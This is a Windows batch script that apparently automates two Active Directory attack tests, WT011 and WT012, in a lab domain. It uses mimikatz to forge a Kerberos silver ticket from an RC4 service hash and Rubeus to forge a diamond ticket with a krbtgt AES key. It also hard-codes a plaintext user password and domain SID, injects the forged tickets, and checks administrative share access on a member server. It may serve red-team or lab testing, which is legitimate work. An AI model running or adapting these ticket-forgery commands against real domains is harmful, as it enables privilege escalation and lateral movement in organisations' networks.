@echo off
REM WT011/012 batch via cmd (proven Rubeus pattern) + mimikatz for silver
set RUBEUS=C:\Tools\ADTools\Rubeus.exe
set MIMI=C:\Tools\ADTools\mimikatz.exe
set OUT=C:\Tools\ADTools

echo ==== RUBEUS BARE ====
"%RUBEUS%" > "%OUT%\rubeus-bare.out" 2>&1
type "%OUT%\rubeus-bare.out"

echo ==== WT011 SILVER (mimikatz golden /service = silver) ====
klist purge >nul 2>&1
"%MIMI%" "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /target:mbr01.child.cadre.local /service:cifs /rc4:3a01c6cd54eab57a78377d0ef10cef3f /id:500 /group:512 /ptt" "exit" > "%OUT%\wt011-mimi.out" 2>&1
type "%OUT%\wt011-mimi.out"
echo --- SILVER SMB VERIFY ---
dir \\mbr01.child.cadre.local\c$ 2>&1
klist > "%OUT%\wt011-klist.out" 2>&1
findstr /i "cifs mbr01" "%OUT%\wt011-klist.out"
klist purge >nul 2>&1

echo ==== WT012 DIAMOND (Rubeus tgtdeleg) ====
"%RUBEUS%" asktgt /user:analyst_t1 /password:T13r_An@lyst! /domain:child.cadre.local /dc:dc02.child.cadre.local /ptt > "%OUT%\wt012-asktgt.out" 2>&1
type "%OUT%\wt012-asktgt.out"
"%RUBEUS%" diamond /tgtdeleg /krbtgt:d64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2 /enctype:aes /service:cifs/mbr01.child.cadre.local /dc:dc02.child.cadre.local /ptt > "%OUT%\wt012-diamond.out" 2>&1
type "%OUT%\wt012-diamond.out"
echo --- DIAMOND SMB VERIFY ---
dir \\mbr01.child.cadre.local\c$ 2>&1
klist > "%OUT%\wt012-klist.out" 2>&1
findstr /i "cifs mbr01" "%OUT%\wt012-klist.out"
klist purge >nul 2>&1

echo ==== WT011_012_CMD_DONE ====
